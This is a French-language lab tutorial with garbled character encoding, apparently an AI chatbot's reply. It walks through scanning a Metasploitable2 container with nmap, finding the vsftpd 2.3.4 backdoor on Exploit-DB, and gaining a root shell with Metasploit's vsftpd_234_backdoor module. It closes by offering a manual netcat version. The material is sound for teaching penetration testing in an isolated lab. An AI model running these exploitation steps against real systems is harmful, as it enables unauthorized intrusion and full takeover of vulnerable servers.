Parfait ğŸ‘Œ Tu veux une dÃ©mo **pÃ©dagogique complÃ¨te** oÃ¹ on :

* Lance un **scan `nmap` depuis `vm1`**
* **DÃ©couvre une version vulnÃ©rable** (ex: vsftpd 2.3.4)
* Puis on **va chercher manuellement lâ€™exploit dans Exploit-DB**
* Et on **lâ€™utilise** pour **prendre le contrÃ´le de la VM**

---

# ğŸ¯ Objectif de la dÃ©mo

* **vm1 (10.10.10.11)** = Attaquant
* **vm2 (10.10.10.12)** = Cible (Metasploitable2 dans Docker avec vsftpd 2.3.4 vulnÃ©rable)

---

# ğŸš€ Ã‰tapes complÃ¨tes de la dÃ©monstration

---

## ğŸ§± Ã‰tape 1 â€“ PrÃ©paration de Metasploitable2 (sur vm2)

```bash
sudo apt update
sudo apt install -y docker.io
sudo docker run -it -p 21:21 -p 6200:6200 tleemcjr/metasploitable2
```

ğŸ’¡ Ce conteneur expose **vsftpd 2.3.4** vulnÃ©rable sur le port 21.

---

## ğŸ” Ã‰tape 2 â€“ Scan avec Nmap (depuis vm1)

```bash
sudo apt install -y nmap
nmap -sV 10.10.10.12 -p21
```

ğŸ¯ RÃ©sultat attendu :

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

âœ… On a repÃ©rÃ© **vsftpd 2.3.4** exposÃ© !

---

## ğŸ“š Ã‰tape 3 â€“ Aller sur Exploit-DB (Ã  la main)

### Option 1 â€“ Avec navigateur sur ta machine hÃ´te :

Ouvre :
ğŸ”— [https://www.exploit-db.com](https://www.exploit-db.com)

Et cherche :

```
vsftpd 2.3.4
```

â¡ RÃ©sultat :
**[vsftpd 2.3.4 - Backdoor Command Execution (EDB-ID: 49757)](https://www.exploit-db.com/exploits/49757)**

---

### Option 2 â€“ Depuis vm1 avec `searchsploit`

Si installÃ© :

```bash
sudo apt install exploitdb
searchsploit -u
searchsploit vsftpd 2.3.4
```

â¡ RÃ©sultat :

```
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.rb
Path: /usr/share/exploitdb/exploits/unix/remote/49757.rb
```

---

## ğŸ’¥ Ã‰tape 4 â€“ Lancer lâ€™exploit depuis vm1

Utilise **Metasploit Framework** :

```bash
sudo apt install -y metasploit-framework
msfconsole
```

Puis dans msf :

```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.12
set RPORT 21
exploit
```

ğŸ¯ RÃ©sultat attendu :

```
[*] 10.10.10.12:21 - Banner: 220 (vsFTPd 2.3.4)
[*] Backdoor service has been spawned, handling...
[*] Command shell session 1 opened
```

ğŸ§¨ Tu as maintenant un shell interactif !

---

## ğŸ§ª Ã‰tape 5 â€“ VÃ©rification de lâ€™accÃ¨s

Dans Metasploit :

```bash
whoami
uname -a
```

â¡ Tu es `root` sur vm2 via une backdoor ! ğŸ˜ˆ

---

# ğŸ§  Bilan pÃ©dagogique

| Ã‰tape                   | Outil         | But                                             |
| ----------------------- | ------------- | ----------------------------------------------- |
| DÃ©couverte service      | `nmap`        | Scanner et dÃ©tecter `vsftpd 2.3.4`              |
| Recherche vulnÃ©rabilitÃ© | Exploit-DB    | Identifier un exploit compatible                |
| Exploitation            | `msfconsole`  | Utiliser `exploit/unix/ftp/vsftpd_234_backdoor` |
| Prise de contrÃ´le       | Shell distant | Obtenir accÃ¨s root grÃ¢ce Ã  un service exposÃ©    |

---

# ğŸ Tu veux une version **sans Metasploit** ?

Je peux te montrer comment faire lâ€™exploitation **Ã  la main avec `nc`**, en exploitant manuellement le `:)` dans le login â†’ ce qui dÃ©clenche lâ€™ouverture du port 6200.

Souhaites-tu cette version **Ã  la main, sans framework** pour dÃ©monstration plus bas-niveau ?
